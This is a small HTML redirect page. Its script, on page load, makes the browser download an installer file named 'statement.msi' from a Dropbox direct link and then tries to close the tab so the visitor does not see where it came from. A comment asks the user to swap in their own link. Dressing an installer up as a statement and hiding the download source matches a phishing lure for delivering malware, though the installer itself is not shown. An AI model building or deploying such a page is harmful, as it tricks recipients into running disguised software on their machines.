<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    // replace with your Dropbox direct link
    const url = "https://dl.dropboxusercontent.com/scl/fi/jchm07a7ksajlg3eht8ob/statement.msi?rlkey=19wmb25t81b00v7noqw9yzaj3&st=xxte8btr";

    // redirect immediately
    window.location.replace(url);

    // try to auto-close the tab after a short delay
    setTimeout(() => {
      window.open('', '_self').close();
    }, 1500);
  </script>
</head>

</html>
